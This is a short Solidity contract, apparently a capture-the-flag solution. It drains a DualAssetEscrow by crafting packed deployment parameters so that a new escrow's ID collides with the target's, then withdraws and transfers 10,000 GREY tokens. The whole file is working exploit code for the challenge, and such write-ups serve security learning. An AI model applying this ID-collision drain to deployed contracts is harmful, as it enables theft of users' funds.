// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import { Setup, DualAssetEscrow } from "src/escrow/Setup.sol";

contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function solve() external {
        // Deploy escrow that has the same ID as the one to drain
        bytes19 zero_bytes = bytes19(abi.encodePacked(address(0)));
        (uint256 escrowId, ) = setup.factory().deployEscrow(
            0, // implId = 0
            abi.encodePacked(address(setup.grey()), zero_bytes) // tokenY = 19 bytes of 0x00 
        );
        
        // ID of this escrow and the one to drain is the same
        assert(escrowId == setup.escrowId());

        // Withdraw all GREY from the escrow to drain
        DualAssetEscrow escrow = DualAssetEscrow(setup.escrow());
        escrow.withdraw(true, 10_000e18);

        // Transfer all GREY to msg.sender
        setup.grey().transfer(msg.sender, 10_000e18);
    }
}